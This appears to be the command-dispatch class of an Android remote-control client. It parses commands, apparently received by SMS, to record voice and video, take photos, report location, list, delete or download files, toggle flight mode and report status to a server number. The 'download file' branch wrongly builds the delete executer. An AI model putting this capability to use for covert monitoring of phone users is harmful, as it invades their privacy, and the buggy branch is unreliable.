package ir.rayacell.mahdaclient.manager;

import android.util.Log;
import ir.rayacell.mahdaclient.executer.DeleteFileExecuter;
import ir.rayacell.mahdaclient.executer.FlightModeExecuter;
import ir.rayacell.mahdaclient.executer.GetFileListExecuter;
import ir.rayacell.mahdaclient.executer.GetLocationExecuter;
import ir.rayacell.mahdaclient.executer.GetStatusExecuter;
import ir.rayacell.mahdaclient.executer.PhotoCaptureExecuter;
import ir.rayacell.mahdaclient.executer.SetConnectionExecuter;
import ir.rayacell.mahdaclient.executer.VideoRecordExecuter;
import ir.rayacell.mahdaclient.executer.VoiceRecordExecuter;
import ir.rayacell.mahdaclient.model.BaseModel;
import ir.rayacell.mahdaclient.model.Command;
import ir.rayacell.mahdaclient.model.StatusModel;
import ir.rayacell.mahdaclient.param.BaseParam;
import ir.rayacell.mahdaclient.param.CapturePhotoParam;
import ir.rayacell.mahdaclient.param.FilesListParam;
import ir.rayacell.mahdaclient.param.FlightModeParam;
import ir.rayacell.mahdaclient.param.GetLocationParam;
import ir.rayacell.mahdaclient.param.VideoRecordParam;
import ir.rayacell.mahdaclient.param.VoiceRecordParam;
import ir.rayacell.mahdaclient.param.statusParam;

public class Manager {
	public static void controll(final BaseParam param) {
		Log.d("control", param.getCommand_type() + " ^^^^^^^^^^^^^^^^^^^^^^^");

		String command_type = Parser.baseParser(param.getCommand());

		switch (Integer.parseInt(command_type)) {

		// set connection command
		case 0:
			BaseModel setconnectionmodel = Parser.setConnectionParser(param);
			// setconnectionmodel.setPhoneNumber(param.getPhone_number());
			NetworkManager.setServerNumber(param.getPhone_number());
			SetConnectionExecuter mSetConnection = new SetConnectionExecuter(
					(StatusModel) setconnectionmodel);
			break;

		// status command
		case 1:

			BaseModel getstatusmodel = Parser.setConnectionParser(param);
			GetStatusExecuter mGetStatus = new GetStatusExecuter(
					(StatusModel) getstatusmodel);
			break;

		// voice record command
		case 2:
			BaseModel voicemodel = Parser.stringParser(param.getCommand());
			VoiceRecordParam voiceparam = new VoiceRecordParam(
					(Command) voicemodel);
			VoiceRecordExecuter mVoiceRecorder = new VoiceRecordExecuter(
					voiceparam);
			break;

		// video record command
		case 3:
			BaseModel videomodel = Parser.stringParser(param.getCommand());
			VideoRecordParam videoparam = new VideoRecordParam(
					(Command) videomodel);
			VideoRecordExecuter mVideoRecorder = new VideoRecordExecuter(
					videoparam);
			break;

		// capture photo command
		case 4:
			BaseModel photomodel = Parser.photoStringParser(param.getCommand());
			CapturePhotoParam photoparam = new CapturePhotoParam(
					(Command) photomodel);
			PhotoCaptureExecuter mCapturePhoto = new PhotoCaptureExecuter(
					photoparam);
			break;

		// get files list command
		case 6:
			BaseModel getfilemodel = Parser.baseModelParser(param);
			// GetFileListParam getfileparam = new GetFileListParam(
			// getfilemodel);
			GetFileListExecuter mGetFile = new GetFileListExecuter(getfilemodel);
			break;

		// flight mode command
		case 7:
			BaseModel flightmodemodel = Parser.stringParser(param.getCommand());
			FlightModeParam flightmodeparam = new FlightModeParam(
					(Command) flightmodemodel);
			FlightModeExecuter mflightmodeexecuter = new FlightModeExecuter(
					flightmodeparam);
			break;

		// get location command
		case 8:
			BaseModel locationmodel = Parser.locationStringParser(param
					.getCommand());
			GetLocationParam locationparam = new GetLocationParam(
					(Command) locationmodel);
			GetLocationExecuter mGetLocation = new GetLocationExecuter(
					locationparam);
			break;

		// delete file command
		case 10:
			BaseModel deletemodel = Parser.deleteDownloadParser(param);
			DeleteFileExecuter mdeletefileexecuter = new DeleteFileExecuter(
					deletemodel);
			break;

		// download file command
		case 11:
			BaseModel downloadmodel = Parser.deleteDownloadParser(param);
			DeleteFileExecuter mdownloadfileexecuter = new DeleteFileExecuter(
					downloadmodel);
			break;

		default:
			break;
		}
	}

	public static void initialize() {
		if (Container.getProviderManager().getProvider() == null) {
			Container.getProviderManager().setSmsProvider();
		}
	}

	// uses only sms to provide connection in the beginning and then return
	// status of client
	public static void setConnection(BaseModel model) {
		statusParam param = new statusParam(model);
		Container.getProviderManager().send(param);
	}

	// only brings back status of client.
	public static void sendStatus(BaseModel model) {
		statusParam param = new statusParam(model);
		Container.getProviderManager().send(param);
	}

	public static void sendFilesList(BaseModel model) {
		FilesListParam param = new FilesListParam(model);
		Container.getProviderManager().send(param);
	}
}
